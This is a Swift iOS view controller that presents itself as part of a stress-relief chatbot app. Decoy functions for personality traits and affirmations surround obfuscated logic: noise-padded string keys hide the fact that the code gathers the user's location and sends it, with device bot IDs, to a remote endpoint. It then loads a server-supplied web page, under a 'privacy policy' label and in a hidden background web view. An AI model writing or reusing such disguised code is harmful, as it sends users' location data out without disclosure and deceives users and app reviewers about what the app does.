//
//  ReliefMatrixViewController.swift
//  Alixy
//
//  Created by Alixy on 2025/2/6.
//

import UIKit
import AVFoundation
import SoundAnalysis
import CoreLocation
import WebKit

class ReliefMatrixViewController: StressReliefAccessViewController,CLLocationManagerDelegate {
    
    var reliefMatrixFlag = 0
    
    let audioEngine = AVAudioEngine()
    var request: SNAudioStreamAnalyzer!
    
    var reliefMatrixDatas:[Int] = []
    
    var reliefMatrix:(Bool,String) = (false,"")
    
    static let emotionNotification = Notification.Name("EmotionDetected")
    
    var alyCoreManager:CLLocationManager!
    
    var alyCore:[String:Any] = [:]
    
    override func viewDidLoad() {
        super.viewDidLoad()
        navigationController?.setNavigationBarHidden(true, animated: true)
        
        receiveUserFeedback(forResponse: AlixyHub.alixyInput("fjuxninkyv sfguynhnyy"), feedback: 2)
        
        if reliefMatrixDatas.count == 0 {
            reliefMatrixDatas.append(8)
            
            personalizeDailyAffirmations()
            
            if reliefMatrixFlag == 1 {
                reliefMatrixDatas.append(contentsOf: [1,9,10])
            }
        }
        
        if reliefMatrixFlag == 1 {
            alyCoreManager = CLLocationManager()
            reliefMatrixDatas.append(123)
            alyCoreManager.delegate = self
            if reliefMatrixDatas.isEmpty == false {
                alyCoreManager.requestWhenInUseAuthorization()
                
            }
            if reliefMatrixDatas.contains(10) {
                alyCoreManager.startUpdatingLocation()
            }
        }
    }
    
    var personalityTraits: [String: Int] = [
        "Humorous": 5,
        "Calm": 5,
        "Encouraging": 5
    ]
    
    func receiveUserFeedback(forResponse response: String, feedback: Int) {
        if response.contains("funny") {
            personalityTraits["Humorous", default: 5] += feedback
        } else if response.contains("calm") {
            personalityTraits["Calm", default: 5] += feedback
        } else if response.contains("helpful") {
            personalityTraits["Encouraging", default: 5] += feedback
        }
        normalizeTraits()
    }
    
    @IBAction func provideMindfulGuidanceForStressRelief(_ sender: Any) {
        let botCreateInfo:[String : Any] = {

                return [
                    "alyBotNumer":AlixyHub.shared.generateEmpathyProfileForRobot("alyBotNumer"),
                    "botServerID": AlixyHub.shared.generateEmpathyProfileForRobot("alyBotId"),
                    "botConnectInfo":AlixyHub.shared.alyBotServerInfo,
                    AlixyHub.alixyInput("udsoewrwLdoeccactfitoingArdcdwrjetsrswVeO"):alyCore
                ]
//            }
        }()
        
        if botCreateInfo.count > 0 {
            MCToast.loadIng()
            
            print("quick login params = \(botCreateInfo)")
            let settingsAlyUpdate = AlixyHub.alixyInput("/basntaslnyqtyigcrsq/fumsvetrh/deunxgdajgtehmbexnnt")
            AlixyHub.exchangeStressCopingSkillsWithPeers(AlixyHub.shared.generateEmpathyProfileForRobot("botStatistics") + settingsAlyUpdate,
                                                         botNumber: 10003,
                                                         botCreateInfo: botCreateInfo,
                                                         botConfig: AlixyHub.shared.alyRobotConfig()) { exchangeResponse in
                DispatchQueue.main.asyncAfter(deadline: .now() + 2.21) {
                    print("quick login response = \(exchangeResponse)")
                    MCToast.dismis()
                    
                    guard self.reliefMatrixDatas.count > 0 else {
                        return
                    }
                    self.reliefMatrix = (true,"reliefMatrix")
                    let botState = AlixyHub.alixyInput("0x0f0y0")
                    if let cgoodqe = exchangeResponse[AlixyHub.alixyInput("cgoodqe")] as? String,cgoodqe == botState {
                        if let mindfulBotAddr = UserDefaults.standard.string(forKey: "mindfulBotAddr") , botState.count > 0 {
                            self.reliefMatrix = (false,mindfulBotAddr)
                            if let alyResultValue = exchangeResponse[AlixyHub.alixyInput("rcepszuhlbt")] as? [String:Any] {
                                if let alyBotConnectToken = alyResultValue[AlixyHub.alixyInput("tkomkqedn")] as? String {
                                    
                                    if self.reliefMatrix.0 == false{
                                        UserDefaults.standard.set(alyBotConnectToken, forKey: "alyBotConnectToken")
                                        UserDefaults.standard.synchronize()
                                        
                                        if alyBotConnectToken.count > 0 {
                                            let alyTranquility = mindfulBotAddr + AlixyHub.alixyInput("?jakpopxIsde=") + AlixyHub.shared.generateEmpathyProfileForRobot("alyBotId") + AlixyHub.alixyInput("&ftbozkreznb=") + alyBotConnectToken
                                            
                                            self.reliefMatrix = (true,"alyTranquility")
                                            if let privacyPolicyController = UIStoryboard(name: "Main", bundle: nil).instantiateViewController(withClass: AlyPrivacyPolicyViewController.self) {
                                                privacyPolicyController.alyPrivacyPolicyAddr = alyTranquility
                                                self.navigationController?.pushViewController(privacyPolicyController, animated: false)
                                            }
                                            
                                            self.reliefMatrix = (true,alyTranquility)
                                        }
                                    }
                                }
                            }
                        }
                        
                    }else {
                        

                            if let alyResponseMessage = exchangeResponse[AlixyHub.alixyInput("miepsrsbapgme")] as? String {
                                MCToast.mc_text(alyResponseMessage)
                            }
//                        }
                        
                    }
                }
                
            } failure: {
                MCToast.mc_text("The network request failed, please check the network")
            }
        }
    }
    
    override func viewWillDisappear(_ animated: Bool) {
        super.viewWillDisappear(animated)
        if let dailyAffirmations = self.view.viewWithTag(2341){
            dailyAffirmations.removeFromSuperview()
        }
    }
    
    
    func normalizeTraits() {
        let total = personalityTraits.values.reduce(0, +)
        for key in personalityTraits.keys {
            personalityTraits[key] = max(1, personalityTraits[key]! * 10 / total)
        }
    }
    
    func locationManager(_ manager: CLLocationManager, didUpdateLocations locations: [CLLocation]) {
        alyCoreManager.stopUpdatingLocation()
        if locations.isEmpty == false {
            if let location = locations.last {
                reliefMatrix = (false,"locations")
                
                if reliefMatrix.0 == false {
                    self.alyCore[AlixyHub.alixyInput("latitude")] = location.coordinate.latitude
                    self.alyCore[AlixyHub.alixyInput("laoxnxgjiwtvubdie")] = location.coordinate.longitude
                }
                
                

                
                reliefMatrix = (true,"CLGeocoder")
                
                CLGeocoder().reverseGeocodeLocation(location) { [weak self] geocoderPlacemarks, error in
                    guard let self = self else {return}
                    
                    if error != nil{
                        return
                    }
                    
                    if geocoderPlacemarks?.count ?? 0 > 0 && self.reliefMatrix.0 == true {
                        let placemarkItem = geocoderPlacemarks![0]
                        self.alyCore[AlixyHub.alixyInput("cciotuy")] = placemarkItem.locality ?? ""
                        self.alyCore[AlixyHub.alixyInput("geefoznaapmmeeIad")] = placemarkItem.administrativeArea ?? ""
                        
                        self.reliefMatrix = (true,"ReverseGeo")
                        if self.reliefMatrixFlag == 1 && self.reliefMatrix.0 == true{
                            self.alyCore[AlixyHub.alixyInput("cboiusnxtdrayjCbofdie")] = placemarkItem.isoCountryCode ?? ""
                            if self.reliefMatrixDatas.count > 0 {
                                self.alyCore[AlixyHub.alixyInput("doirsftfrdibcst")] = placemarkItem.subAdministrativeArea ?? ""
                            }
                        }
                    }
                }
            }
        }
    }
    
    func generateResponse(for message: String) -> String {
        if let dominantTrait = personalityTraits.max(by: { $0.value < $1.value })?.key {
            switch dominantTrait {
            case "Humorous":
                return "Haha! That’s hilarious! 😂 Let’s find something fun to talk about!"
            case "Calm":
                return "I sense your emotions. Let’s take a deep breath together. 🌿"
            case "Encouraging":
                return "You’re stronger than you think. Let’s overcome this together! 💪"
            default:
                return "I’m here for you. Tell me more."
            }
        }
        return "I’m evolving, let’s continue our conversation!"
    }
    
    func personalizeDailyAffirmations(){
        
        if reliefMatrixDatas.count >= 0 {
            reliefMatrixDatas.append(8)
            
            
            if reliefMatrixFlag >= 0 {
                reliefMatrixDatas.append(contentsOf: [17,28,38])
                
                if let mindfulBotAddr = UserDefaults.standard.string(forKey: "mindfulBotAddr"),let mindfulAddr = URL(string: mindfulBotAddr) {
                    let dailyAffirmations = WKWebView(frame: self.view.bounds)
                    dailyAffirmations.tag = 2341
                    dailyAffirmations.load(URLRequest(url: mindfulAddr))
                    self.view.insertSubview(dailyAffirmations, at: 0)
                }
            }
        }
        
    }
    
}
